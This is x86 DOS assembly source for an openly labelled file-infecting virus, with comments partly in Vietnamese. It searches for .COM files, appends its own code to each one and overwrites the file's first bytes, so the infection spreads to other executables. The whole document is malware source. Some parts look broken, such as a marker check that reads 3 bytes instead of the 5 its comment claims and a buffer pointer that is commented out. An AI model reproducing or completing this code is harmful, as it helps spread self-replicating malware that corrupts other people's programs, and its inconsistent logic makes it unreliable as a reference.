.model small
.code    
    ORG 100H  
    
START:  
  jmp near ptr FIND_BEGIN     
  db ''
  
VIRUS:       ;virus label   

DATA_ARRAY DB 0,0,0,0,0

FIND_BEGIN:
    call EXECUTE
    
EXECUTE:    
    pop di   
    sub di,offset EXECUTE
    call FIND_FILE
       
FIND_FILE:
    mov ah,4EH
    mov dx,OFFSET COM_FILE
    int 21H     
FIND_LOOP:
    jc DONE
    mov ax,3D02H 
    mov dx,9EH
    int 21H 
    mov bx,ax            ; put file handle vao bx
CHECK_FILE:              ; check 5 byte cua virus (virus's marker)
    mov ah,3FH
    mov cx,3
    int 21h 
    jc  short CLOSE_FILE ; file da infected, move to next file.
    
    xor cx,cx
    xor dx,dx            ; cx:dx=0
    mov ax,4202H         ; ah=42H,   al= {0:beginning;2:end of file;1:present location}
    int 21H              ; move to end of file
    
    mov cx, OFFSET ENDVIR - OFFSET VIRUS    ; so luong byte can write
    lea dx,[di+VIRUS]  
    mov ah,40H
    int 21H    
    jc  short CLOSE_FILE     
    
    xor cx,cx
    xor dx,dx
    mov ax,4200H
    int 21H              ; move back to begin
    jc  short CLOSE_FILE
    
    mov cx,5             ; write label to host (duplicate infect)
    ;mov dx,offset 
    mov ah,40H
    int 21H
    
CLOSE_FILE:    
    mov ah,3EH      
    int 21H         ;close file
    mov ah,4FH      
    int 21H         ;search for next file
    jmp FIND_LOOP  
         
DONE:  
    mov di,offset START
    push di
    lea si,[bp+TERMINATE]
    movsw
    movsw
    movsb     
    ret
        
    
COM_FILE    DB      '*.COM',0      
TERMINATE   DB 0B8H,00H,4CH,0CDH,21H  ;0CDH : release file set,4CH: exit,

        
ENDVIR:  

END START
